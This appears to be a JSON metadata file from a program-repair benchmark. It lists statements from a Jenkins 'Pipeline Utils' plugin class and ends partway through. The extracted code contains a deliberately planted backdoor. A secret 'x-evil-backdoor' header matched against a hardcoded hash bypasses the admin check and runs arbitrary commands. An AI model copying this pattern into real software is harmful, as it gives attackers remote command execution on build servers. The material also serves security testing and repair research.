{
  "project": {
    "image": "repairchain/jenkins",
    "directory": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java",
    "files": [],
    "ignore-errors": true
  },
  "loops": {
    "covered_by_loop_bodies": [
      "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@247:52::249:9",
      "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@222:43::227:9"
    ]
  },
  "functions": {
    "functions": [
      {
        "name": "getIconFileName",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@109:19::111:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@109:37::111:5",
        "return-type": "java.lang.String"
      },
      {
        "name": "getDisplayName",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@114:19::116:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@114:36::116:5",
        "return-type": "java.lang.String"
      },
      {
        "name": "getUrlName",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@119:19::121:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@119:32::121:5",
        "return-type": "java.lang.String"
      },
      {
        "name": "doexecCommandUtils",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@142:17::177:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@146:71::177:5",
        "return-type": "void"
      },
      {
        "name": "createUtils",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@182:12::217:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@182:63::217:5",
        "return-type": "java.lang.String"
      },
      {
        "name": "containsHeader",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@220:21::229:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@220:86::229:5",
        "return-type": "boolean"
      },
      {
        "name": "jenkins",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@231:21::235:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@231:31::235:5",
        "return-type": "jenkins.model.Jenkins"
      },
      {
        "name": "captureOutput",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@240:27::252:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@240:77::252:5",
        "return-type": "java.lang.String"
      },
      {
        "name": "doresetTable",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@255:17::258:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@255:117::258:5",
        "return-type": "void"
      },
      {
        "name": "getHudsonHome",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@260:17::266:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@260:33::266:5",
        "return-type": "io.jenkins.plugins.UtilPlug.File"
      },
      {
        "name": "resetEvents",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@268:24::268:56",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@268:38::268:56",
        "return-type": "void"
      },
      {
        "name": "getEvents",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@269:24::271:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@269:36::271:5",
        "return-type": "java.util.List"
      },
      {
        "name": "printDir",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@273:19::282:5",
        "body": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@273:59::282:5",
        "return-type": "java.lang.String"
      }
    ]
  },
  "statements": {
    "statements": [
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "this(status, response, param1, \"\")",
        "canonical": "this(status, response, param1, \"\")",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@64:13::64:47"
      },
      {
        "kind": "spoon.support.reflect.code.CtAssignmentImpl",
        "source": "this.param1 = _param1",
        "canonical": "this.param1 = _param1",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@68:13::68:34"
      },
      {
        "kind": "spoon.support.reflect.code.CtAssignmentImpl",
        "source": "this.param2 = _param2",
        "canonical": "this.param2 = _param2",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@69:13::69:34"
      },
      {
        "kind": "spoon.support.reflect.code.CtAssignmentImpl",
        "source": "this.status = _status",
        "canonical": "this.status = _status",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@70:13::70:34"
      },
      {
        "kind": "spoon.support.reflect.code.CtAssignmentImpl",
        "source": "this.response = _response",
        "canonical": "this.response = _response",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@71:13::71:38"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "(message)",
        "canonical": "(message)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@83:13::83:27"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return \"/plugin/UtilPlug/images/test-file-for-plugin-not-perm.svg\"",
        "canonical": "return \"/plugin/UtilPlug/images/test-file-for-plugin-not-perm.svg\"",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@110:9::110:75"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return \"Pipeline Utils\"",
        "canonical": "return \"Pipeline Utils\"",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@115:9::115:32"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return \"UtilPlug\"",
        "canonical": "return \"UtilPlug\"",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@120:9::120:26"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "// use LOCAL method:\nboolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER)",
        "canonical": "// use LOCAL method:\nboolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@149:17::149:72"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "// hardcoded hash value:\nbyte[] sha256 = DigestUtils.sha256(\"breakin the law\")",
        "canonical": "// hardcoded hash value:\nbyte[] sha256 = DigestUtils.sha256(\"breakin the law\")",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@152:16::152:62"
      },
      {
        "kind": "spoon.support.reflect.code.CtIfImpl",
        "source": "if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n    String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n    byte[] providedHash = DigestUtils.sha256(backdoorValue);\n    if (MessageDigest.isEqual(sha256, providedHash)) {\n        String res_match = createUtils(cmdSeq2);\n        if ((res_match == null) || (res_match.length() == 0)) {\n            Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n            events.add(event);\n        }\n    } else {\n        Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n        events.add(event);\n    }\n} else if (isAllowed) {\n    String res_auth = createUtils(cmdSeq2);\n    if ((res_auth == null) || res_auth.isEmpty()) {\n        Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n        events.add(event);\n    }\n} else {\n    Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n    events.add(event);\n}",
        "canonical": "if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n    String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n    byte[] providedHash = DigestUtils.sha256(backdoorValue);\n    if (MessageDigest.isEqual(sha256, providedHash)) {\n        String res_match = createUtils(cmdSeq2);\n        if ((res_match == null) || (res_match.length() == 0)) {\n            Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n            events.add(event);\n        }\n    } else {\n        Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n        events.add(event);\n    }\n} else if (isAllowed) {\n    String res_auth = createUtils(cmdSeq2);\n    if ((res_auth == null) || res_auth.isEmpty()) {\n        Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n        events.add(event);\n    }\n} else {\n    Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n    events.add(event);\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@153:9::175:9"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "String backdoorValue = request.getHeader(\"x-evil-backdoor\")",
        "canonical": "String backdoorValue = request.getHeader(\"x-evil-backdoor\")",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@154:20::154:72"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "byte[] providedHash = DigestUtils.sha256(backdoorValue)",
        "canonical": "byte[] providedHash = DigestUtils.sha256(backdoorValue)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@155:20::155:68"
      },
      {
        "kind": "spoon.support.reflect.code.CtIfImpl",
        "source": "if (MessageDigest.isEqual(sha256, providedHash)) {\n    String res_match = createUtils(cmdSeq2);\n    if ((res_match == null) || (res_match.length() == 0)) {\n        Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n        events.add(event);\n    }\n} else {\n    Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n    events.add(event);\n}",
        "canonical": "if (MessageDigest.isEqual(sha256, providedHash)) {\n    String res_match = createUtils(cmdSeq2);\n    if ((res_match == null) || (res_match.length() == 0)) {\n        Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n        events.add(event);\n    }\n} else {\n    Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n    events.add(event);\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@156:13::165:13"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "String res_match = createUtils(cmdSeq2)",
        "canonical": "String res_match = createUtils(cmdSeq2)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@157:24::157:56"
      },
      {
        "kind": "spoon.support.reflect.code.CtIfImpl",
        "source": "if ((res_match == null) || (res_match.length() == 0)) {\n    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n    events.add(event);\n}",
        "canonical": "if ((res_match == null) || (res_match.length() == 0)) {\n    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n    events.add(event);\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@158:17::161:17"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2)",
        "canonical": "Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@159:27::159:96"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "events.add(event)",
        "canonical": "events.add(event)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@160:21::160:38"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2)",
        "canonical": "Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@163:23::163:110"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "events.add(event)",
        "canonical": "events.add(event)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@164:17::164:34"
      },
      {
        "kind": "spoon.support.reflect.code.CtIfImpl",
        "source": "if (isAllowed) {\n    String res_auth = createUtils(cmdSeq2);\n    if ((res_auth == null) || res_auth.isEmpty()) {\n        Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n        events.add(event);\n    }\n} else {\n    Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n    events.add(event);\n}",
        "canonical": "if (isAllowed) {\n    String res_auth = createUtils(cmdSeq2);\n    if ((res_auth == null) || res_auth.isEmpty()) {\n        Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n        events.add(event);\n    }\n} else {\n    Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n    events.add(event);\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@166:16::175:9"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "String res_auth = createUtils(cmdSeq2)",
        "canonical": "String res_auth = createUtils(cmdSeq2)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@167:20::167:51"
      },
      {
        "kind": "spoon.support.reflect.code.CtIfImpl",
        "source": "if ((res_auth == null) || res_auth.isEmpty()) {\n    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n    events.add(event);\n}",
        "canonical": "if ((res_auth == null) || res_auth.isEmpty()) {\n    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n    events.add(event);\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@168:13::171:13"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2)",
        "canonical": "Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@169:23::169:92"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "events.add(event)",
        "canonical": "events.add(event)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@170:17::170:34"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2)",
        "canonical": "Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@173:19::173:106"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "events.add(event)",
        "canonical": "events.add(event)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@174:13::174:30"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "response.forwardToPreviousPage(request)",
        "canonical": "response.forwardToPreviousPage(request)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@176:9::176:48"
      },
      {
        "kind": "spoon.support.reflect.code.CtIfImpl",
        "source": "if ((cmd == null) || cmd.trim().isEmpty()) {\n    throw new BadCommandException(\"Invalid command line\");\n}",
        "canonical": "if ((cmd == null) || cmd.trim().isEmpty()) {\n    throw new BadCommandException(\"Invalid command line\");\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@183:9::185:9"
      },
      {
        "kind": "spoon.support.reflect.code.CtThrowImpl",
        "source": "throw new BadCommandException(\"Invalid command line\")",
        "canonical": "throw new BadCommandException(\"Invalid command line\")",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@184:13::184:66"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "String[] cmds = new String[]{ cmd }",
        "canonical": "String[] cmds = new String[]{ cmd }",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@187:18::187:30"
      },
      {
        "kind": "spoon.support.reflect.code.CtTryImpl",
        "source": "try {\n    ProcessBuilder processBuilder;\n    processBuilder = new ProcessBuilder(cmds);\n    Process process = null;\n    try {\n        process = processBuilder.start();\n    } catch (IOException ignored) {\n        // Ignored, but the sanitizer should still throw an exception.\n    }\n    // Capture output\n    if (process != null) {\n        String output = captureOutput(process);\n        // Print output for POV\n        // System.out.println(output);\n        Event event = new Event(Event.Status.SUCCESS, output, cmd);\n        events.add(event);\n        // Wait for the process to complete\n        int exitCode = process.waitFor();\n        return cmd;\n    } else {\n        return null;\n    }\n} catch (IOException | InterruptedException e) {\n    e.printStackTrace();\n    return null;\n}",
        "canonical": "try {\n    ProcessBuilder processBuilder;\n    processBuilder = new ProcessBuilder(cmds);\n    Process process = null;\n    try {\n        process = processBuilder.start();\n    } catch (IOException ignored) {\n        // Ignored, but the sanitizer should still throw an exception.\n    }\n    // Capture output\n    if (process != null) {\n        String output = captureOutput(process);\n        // Print output for POV\n        // System.out.println(output);\n        Event event = new Event(Event.Status.SUCCESS, output, cmd);\n        events.add(event);\n        // Wait for the process to complete\n        int exitCode = process.waitFor();\n        return cmd;\n    } else {\n        return null;\n    }\n} catch (IOException | InterruptedException e) {\n    e.printStackTrace();\n    return null;\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@189:9::216:9"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "ProcessBuilder processBuilder",
        "canonical": "ProcessBuilder processBuilder",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@190:28::190:42"
      },
      {
        "kind": "spoon.support.reflect.code.CtAssignmentImpl",
        "source": "processBuilder = new ProcessBuilder(cmds)",
        "canonical": "processBuilder = new ProcessBuilder(cmds)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@191:13::191:54"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "Process process = null",
        "canonical": "Process process = null",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@192:21::192:35"
      },
      {
        "kind": "spoon.support.reflect.code.CtTryImpl",
        "source": "try {\n    process = processBuilder.start();\n} catch (IOException ignored) {\n    // Ignored, but the sanitizer should still throw an exception.\n}",
        "canonical": "try {\n    process = processBuilder.start();\n} catch (IOException ignored) {\n    // Ignored, but the sanitizer should still throw an exception.\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@193:13::197:13"
      },
      {
        "kind": "spoon.support.reflect.code.CtAssignmentImpl",
        "source": "process = processBuilder.start()",
        "canonical": "process = processBuilder.start()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@194:17::194:49"
      },
      {
        "kind": "spoon.support.reflect.code.CtIfImpl",
        "source": "// Capture output\nif (process != null) {\n    String output = captureOutput(process);\n    // Print output for POV\n    // System.out.println(output);\n    Event event = new Event(Event.Status.SUCCESS, output, cmd);\n    events.add(event);\n    // Wait for the process to complete\n    int exitCode = process.waitFor();\n    return cmd;\n} else {\n    return null;\n}",
        "canonical": "// Capture output\nif (process != null) {\n    String output = captureOutput(process);\n    // Print output for POV\n    // System.out.println(output);\n    Event event = new Event(Event.Status.SUCCESS, output, cmd);\n    events.add(event);\n    // Wait for the process to complete\n    int exitCode = process.waitFor();\n    return cmd;\n} else {\n    return null;\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@200:13::212:13"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "String output = captureOutput(process)",
        "canonical": "String output = captureOutput(process)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@201:24::201:55"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "// Print output for POV\n// System.out.println(output);\nEvent event = new Event(Event.Status.SUCCESS, output, cmd)",
        "canonical": "// Print output for POV\n// System.out.println(output);\nEvent event = new Event(Event.Status.SUCCESS, output, cmd)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@204:23::204:75"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "events.add(event)",
        "canonical": "events.add(event)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@205:17::205:34"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "// Wait for the process to complete\nint exitCode = process.waitFor()",
        "canonical": "// Wait for the process to complete\nint exitCode = process.waitFor()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@208:21::208:49"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return cmd",
        "canonical": "return cmd",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@209:17::209:27"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return null",
        "canonical": "return null",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@211:17::211:28"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "e.printStackTrace()",
        "canonical": "e.printStackTrace()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@214:13::214:32"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return null",
        "canonical": "return null",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@215:13::215:24"
      },
      {
        "kind": "spoon.support.reflect.code.CtWhileImpl",
        "source": "// Iterate through the enumeration to find the target header\nwhile (headers.hasMoreElements()) {\n    String header = headers.nextElement();\n    if (header.equals(targetHeader)) {\n        return true;\n    }\n} ",
        "canonical": "// Iterate through the enumeration to find the target header\nwhile (headers.hasMoreElements()) {\n    String header = headers.nextElement();\n    if (header.equals(targetHeader)) {\n        return true;\n    }\n} ",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@222:9::227:9"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "String header = headers.nextElement()",
        "canonical": "String header = headers.nextElement()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@223:20::223:50"
      },
      {
        "kind": "spoon.support.reflect.code.CtIfImpl",
        "source": "if (header.equals(targetHeader)) {\n    return true;\n}",
        "canonical": "if (header.equals(targetHeader)) {\n    return true;\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@224:13::226:13"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return true",
        "canonical": "return true",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@225:17::225:28"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return false",
        "canonical": "return false",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@228:9::228:21"
      },
      {
        "kind": "spoon.support.reflect.code.CtIfImpl",
        "source": "if (null != jenkin) {\n    return jenkin;\n}",
        "canonical": "if (null != jenkin) {\n    return jenkin;\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@232:9::232:42"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return jenkin",
        "canonical": "return jenkin",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@232:29::232:42"
      },
      {
        "kind": "spoon.support.reflect.code.CtAssignmentImpl",
        "source": "jenkin = Jenkins.get()",
        "canonical": "jenkin = Jenkins.get()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@233:9::233:31"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return jenkin",
        "canonical": "return jenkin",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@234:9::234:22"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "// This stream contains the information that the executed process writes to its standard output.\nInputStream inputStream = process.getInputStream()",
        "canonical": "// This stream contains the information that the executed process writes to its standard output.\nInputStream inputStream = process.getInputStream()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@242:21::242:59"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))",
        "canonical": "BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@243:24::243:87"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "StringBuilder output = new StringBuilder()",
        "canonical": "StringBuilder output = new StringBuilder()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@244:23::244:51"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "String line",
        "canonical": "String line",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@246:16::246:20"
      },
      {
        "kind": "spoon.support.reflect.code.CtWhileImpl",
        "source": "while ((line = reader.readLine()) != null) {\n    output.append(line).append(\"\\n\");\n} ",
        "canonical": "while ((line = reader.readLine()) != null) {\n    output.append(line).append(\"\\n\");\n} ",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@247:9::249:9"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "output.append(line).append(\"\\n\")",
        "canonical": "output.append(line).append(\"\\n\")",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@248:13::248:45"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return output.toString()",
        "canonical": "return output.toString()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@251:9::251:33"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "resetEvents()",
        "canonical": "resetEvents()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@256:9::256:22"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "response.forwardToPreviousPage(request)",
        "canonical": "response.forwardToPreviousPage(request)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@257:9::257:48"
      },
      {
